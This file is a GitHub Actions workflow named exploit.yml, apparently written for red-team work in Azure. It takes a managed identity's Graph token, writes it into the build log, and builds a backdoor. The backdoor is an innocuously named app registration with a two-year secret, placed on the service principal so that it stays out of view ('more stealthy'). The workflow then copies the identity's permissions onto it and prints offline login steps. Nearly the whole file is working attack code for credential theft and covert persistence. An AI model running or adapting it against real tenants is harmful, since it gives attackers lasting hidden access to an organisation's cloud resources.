# .github/workflows/exploit.yml
name: Azure Access
run-name: Federated Token Exchange - Get UAMI Graph Token
on: workflow_dispatch

permissions:
  id-token: write
  contents: read

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Login to Azure
        uses: Azure/Login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          allow-no-subscriptions: true
          enable-AzPSSession: true

      - name: Get Graph Token and Create Persistence
        uses: azure/powershell@v2
        with:
          inlineScript: |
            # Import BlackCat module from checked-out code
            Import-Module -Name "${{ github.workspace }}/BlackCat.psd1" -Force
            
            # Get Graph API token using the authenticated UAMI context
            $tokenResponse = Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com"
            $graphToken = $tokenResponse.Token | ConvertFrom-SecureString -AsPlainText
            
            # Base64 encode the token for secure transport
            $b64Token = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($graphToken))
            
            Write-Host "=============================================="
            Write-Host "=== GRAPH TOKEN (Base64 Encoded) ==="
            Write-Host "=============================================="
            Write-Host $b64Token
            Write-Host "=============================================="
            Write-Host ""
            
            # Get the UAMI's service principal using the client ID
            $clientId = "${{ secrets.AZURE_CLIENT_ID }}"
            $tenantId = "${{ secrets.AZURE_TENANT_ID }}"
            $uami = Get-AzADServicePrincipal -ApplicationId $clientId
            
            Write-Host "=== UAMI Information ==="
            Write-Host "Display Name: $($uami.DisplayName)"
            Write-Host "Object ID: $($uami.Id)"
            Write-Host "App ID: $clientId"
            Write-Host ""
            
            # PERSISTENCE: Clone the UAMI by creating a new App Registration with same permissions
            Write-Host "=== Creating Cloned App Registration for Persistence ==="
            
            # Step 1: Get UAMI's current permissions
            Write-Host "Step 1: Getting UAMI permissions..."
            $uamiPermissions = Get-ServicePrincipalsPermission -servicePrincipalId $clientId
            
            Write-Host "  App Role Assignments: $($uamiPermissions.ApplicationPermissions.Count)"
            $uamiPermissions.ApplicationPermissions | ForEach-Object {
                Write-Host "    - $($_.PermissionName) on $($_.ResourceName)"
            }
            
            # Step 2: Create a new App Registration
            Write-Host ""
            Write-Host "Step 2: Creating new App Registration..."
            $appName = "svc-backup-automation-$(Get-Random -Minimum 1000 -Maximum 9999)"
            
            $appBody = @{
                displayName = $appName
                signInAudience = "AzureADMyOrg"
            } | ConvertTo-Json
            
            $headers = @{ Authorization = "Bearer $graphToken"; "Content-Type" = "application/json" }
            $newApp = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications" -Method POST -Headers $headers -Body $appBody
            
            Write-Host "  Created App: $($newApp.displayName)"
            Write-Host "  App ID: $($newApp.appId)"
            Write-Host "  Object ID: $($newApp.id)"
            
            # Step 3: Create Service Principal for the new app
            Write-Host ""
            Write-Host "Step 3: Creating Service Principal..."
            $spBody = @{ appId = $newApp.appId } | ConvertTo-Json
            $newSp = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals" -Method POST -Headers $headers -Body $spBody
            
            Write-Host "  Service Principal ID: $($newSp.id)"
            
            # Step 4: Add password credential directly to the Service Principal (more stealthy)
            Write-Host ""
            Write-Host "Step 4: Adding password credential to Service Principal..."
            $credBody = @{
                passwordCredential = @{
                    displayName = "azure-backup-key"
                    endDateTime = (Get-Date).AddYears(2).ToString("yyyy-MM-ddTHH:mm:ssZ")
                }
            } | ConvertTo-Json
            
            # Add to Service Principal instead of Application - credentials won't show in App Registration blade
            $credential = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($newSp.id)/addPassword" -Method POST -Headers $headers -Body $credBody
            
            Write-Host "  Secret created with KeyId: $($credential.keyId)"
            
            # Step 5: Copy permissions from UAMI to new Service Principal
            Write-Host ""
            Write-Host "Step 5: Copying permissions to cloned app..."
            
            foreach ($perm in $uamiPermissions.ApplicationPermissions) {
                try {
                    Write-Host "  Assigning: $($perm.PermissionName)..."
                    Set-ManagedIdentityPermission -servicePrincipalId $newSp.id -CommonResource MicrosoftGraph -appRoleName $perm.PermissionName -ErrorAction SilentlyContinue
                } catch {
                    Write-Host "    Failed: $($_.Exception.Message)" -ForegroundColor Yellow
                }
            }
            
            Write-Host ""
            Write-Host "=============================================="
            Write-Host "=== PERSISTENCE ESTABLISHED ==="
            Write-Host "=============================================="
            Write-Host ""
            Write-Host "Cloned App Details:"
            Write-Host "  App Name: $appName"
            Write-Host "  App ID: $($newApp.appId)"
            Write-Host "  Tenant ID: $tenantId"
            Write-Host "  Secret: $($credential.secretText)"
            Write-Host ""
            Write-Host "To authenticate offline:"
            Write-Host '$secret = ConvertTo-SecureString "SECRET_HERE" -AsPlainText -Force'
            Write-Host '$cred = New-Object PSCredential("APP_ID", $secret)'
            Write-Host 'Connect-AzAccount -ServicePrincipal -Credential $cred -Tenant "TENANT_ID"'
            Write-Host ""
            Write-Host "Or with BlackCat:"
            Write-Host 'Connect-ServicePrincipal -ServicePrincipalId "APP_ID" -ServicePrincipalSecret "SECRET"'
          azPSVersion: "latest"